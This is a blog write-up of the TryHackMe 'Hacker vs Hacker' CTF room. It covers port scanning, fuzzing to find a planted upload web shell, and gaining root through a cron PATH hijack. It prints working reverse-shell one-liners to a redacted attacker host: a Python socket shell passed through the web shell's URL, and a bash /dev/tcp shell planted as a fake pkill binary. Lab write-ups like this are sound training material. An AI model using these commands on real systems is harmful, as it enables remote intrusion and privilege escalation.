---
layout: post
current: post
cover: 'assets/images/hackervshacker/cover.png'
navigation: True
title: "Hacker vs Hacker Write up"
date: 2022-08-21 00:00:00
tags: [tryhackme, ctf, easy]
class: post-template
subclass: 'post'
author: darryn
---
![cover](/assets/images/hackervshacker/cover.png)

### Overview

[Hacker Vs Hacker](https://tryhackme.com/room/hackervshacker) is a easy rated CTF room on [TryHackMe](https://tryhackme.com) created by [Aquinas](https://tryhackme.com/p/Aquinas). 

The description for this room is:

"The server of this recruitment company appears to have been hacked, and the hacker has defeated all attempts by the admins to fix the machine. They can't shut it down (they'd lose SEO!) so maybe you can help?"

So this is going to be different to typical CTF room! 

### Nmap

I deployed the machine and was given the target IP 10.10.212.207. I started a NMAP scan to check the available ports. 

{% highlight shell %}
$sudo nmap -sC -sV -oA nmap/initial 10.10.212.207
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-21 10:32 BST
Nmap scan report for 10.10.212.207
Host is up (0.076s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.67 seconds
{% endhighlight %}

2 Ports open:

- 22 - SSH - OpenSSH 8.2p1 Ubuntu
- 80 - HTTP - Apache httpd 2.4.41

I also ran a full port scan but no additional ports were open.

### Enumeration
Checking out the website on port 80, its very basic but at the bottom is a feature to upload a CV.

![upload](/assets/images/hackervshacker/upload.png)

I created a file called test.txt just so I could try uploading something. However when I submit the request I get the response:

"Hacked! If you dont want me to upload my shell, do better at filtering!"

I looked at the source code of the page to see if provide any further information and found:

![hacked](/assets/images/hackervshacker/hacked.png)

I tried to upload a .pdf file but got the same response so it doesn't look like I can upload my own script to create a shell. Looking at the source code, two things jump out. The first is files are uploaded to '/cvs/'. Second the script is checking '.pdf' is included in the filename using the function 'strpos'.

> The strpos() function finds the position of the first occurrence of a string inside another string.

If I was the hacker, to bypass this filtering I would have uploaded a file called something like 'rce.pdf.php'. So I fuzzed the cvs directory for any files with the extensions '.pdf.php'. 

{% highlight shell %}
$wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/common.txt --hc 404,403 http://10.10.212.207/cvs/FUZZ.pdf.php
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.212.207/cvs/FUZZ.pdf.php
Total requests: 4661

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                           
=====================================================================

000003693:   200        1 L      2 W        18 Ch       "shell"                                                                                                           

Total time: 0
Processed Requests: 4661
Filtered Requests: 4660
Requests/sec.: 0
{% endhighlight %}

I got a hit! So now to find the parameter used to execute commands, typically its something like 'cmd' which it was but if it wasn't it could be fuzzed.

{% highlight shell %}
$wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/common.txt --hc 404,403 http://10.10.212.207/cvs/shell.pdf.php?FUZZ=id                                                  
                                                     
********************************************************                                                                                                                           
* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                                           
********************************************************                                                                                                                           
                                                                                                                                                                                   
Target: http://10.10.212.207/cvs/shell.pdf.php?FUZZ=id                                                                                                                             
Total requests: 4661                                                                                                                                                               
                                                                                                                                                                                   
=====================================================================                                                                                                              
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
=====================================================================                                                                                                              
                                                                                                                                                                                   
000000001:   200        1 L      2 W        18 Ch       ".bash_history"                                                                                                            
000000003:   200        1 L      2 W        18 Ch       ".cache"                                                                                                                   
000000012:   200        1 L      2 W        18 Ch       ".htpasswd"                                                                                                                
000000014:   200        1 L      2 W        18 Ch       ".listings"                                                                                                        
000000010:   200        1 L      2 W        18 Ch       ".hta"                                                                                                             
000000015:   200        1 L      2 W        18 Ch       ".mysql_history"                                                                                                   
000000016:   200        1 L      2 W        18 Ch       ".passwd"                                                                                                          
000000011:   200        1 L      2 W        18 Ch       ".htaccess"                                                                                                        
{% endhighlight %}

Everything is returning a 200 response so instead of filtering based on the HTTP response code I changed the filter to be based on the characters in the response.

{% highlight shell %}
$wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/common.txt --hh 18 http://10.10.212.207/cvs/shell.pdf.php?FUZZ=id

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.212.207/cvs/shell.pdf.php?FUZZ=id
Total requests: 4661

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                           
=====================================================================

000001100:   200        2 L      5 W        72 Ch       "cmd"                                                                                                             
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 1779
Filtered Requests: 1778
Requests/sec.: 0
{% endhighlight %}

### Initial Access
Now I have command execution, I first tried to get a shell. I started a netcat listener with the command ```nc -nvlp 4444```. 

Then from the browser, I entered: 

http://10.10.212.207/cvs/shell.pdf.php?cmd=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%22{{REDACTED}}%22,4444));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22/bin/bash%22)%27

> A great resource for quickly creating reverse shell commands is https://www.revshells.com

I got a hit back but shortly afterwards the shell died with the message 'nope'. 

{% highlight shell %}
$nc -nvlp 4444
listening on [any] 4444 ...
connect to [{{REDACTED}}] from (UNKNOWN) [10.10.212.207] 41984
www-data@b2r:/var/www/html/cvs$ nope
{% endhighlight %}

The hacker was killing my connection (rude!). So instead of getting a shell I used the 'shell.pdf.php' script to enumerate the machine. To make this easier and used Burp and send the request to the Repeater tab.

![home](/assets/images/hackervshacker/home.png)

There is a single home directory for lachlan. The '.bash_history' is not empty so I checked that first. 

![history](/assets/images/hackervshacker/history.png)

It looks like the password was changed, I tried to login as the lachlan user with the password.

{% highlight shell %}
$ssh lachlan@10.10.212.207
lachlan@10.10.212.207's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 21 Aug 2022 10:20:11 AM UTC

  System load:  0.58              Processes:             135
  Usage of /:   25.1% of 9.78GB   Users logged in:       0
  Memory usage: 26%               IPv4 address for eth0: 10.10.212.207
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Aug 21 10:19:58 2022 from {{REDACTED}}
$ nope
Connection to 10.10.212.207 closed.
{% endhighlight %}

The same happened as the python shell, I got kicked out.

### Priv Esc
I looked at the persistence cron. 

![persistence](/assets/images/hackervshacker/persistence.png)

The hacker is first setting the path to '/home/lachlan/bin:/bin:/usr/bin' which means it will check the '/home/lachlan/bin' folder for binaries first. Then the cron is running commands to kill any connections. Most of the commands are using absolute paths however, 'pkill' is not. So if I can add a file in '/home/lachlan/bin/' with the name 'pkill' that should be executed with the permissions of root.

The lachlan user owns the bin folder so if I can log in using SSH and execute the commands quickly enough I should be able to create the file before the session is killed.

I copied the following command to my clipboard:

echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/{{REDACTED}}/4444 0>&1'" > /home/lachlan/bin/pkill; chmod +x /home/lachlan/bin/pkill

I restarted my netcat listener, SSH'd to the machine as lachlan and pasted the command. A second later I got a shell!

{% highlight shell %}
$nc -nvlp 4444
listening on [any] 4444 ...
connect to [{{REDACTED}}] from (UNKNOWN) [10.10.212.207] 41998
bash: cannot set terminal process group (4040): Inappropriate ioctl for device
bash: no job control in this shell
root@b2r:~# 
{% endhighlight %}

Thats root!

Thanks for reading!

==========================================================================

Any comments or feedback welcome! You can find me on [twitter](https://twitter.com/dazbrownfield).

<a href="https://www.buymeacoffee.com/dazbrownfield" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
